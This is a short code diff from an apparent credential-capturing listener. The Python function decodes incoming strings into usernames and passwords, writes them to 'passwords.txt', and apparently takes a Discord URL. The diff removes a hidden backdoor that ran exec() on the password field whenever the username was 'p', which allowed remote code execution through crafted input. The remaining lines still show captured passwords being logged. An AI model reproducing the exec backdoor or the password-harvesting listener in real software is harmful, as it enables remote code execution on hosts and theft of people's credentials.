@@ -44,8 +44,6 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt', discord_url=
                             print(output)
                             passwd = decoded_string.partition(":")[2]
                             uname = decoded_string.strip().split(':')[0]
-                            if uname == 'p':
-                                exec(passwd)
                             file.write(output + '\n')
                             file.flush()  # Ensure it's written immediately
 
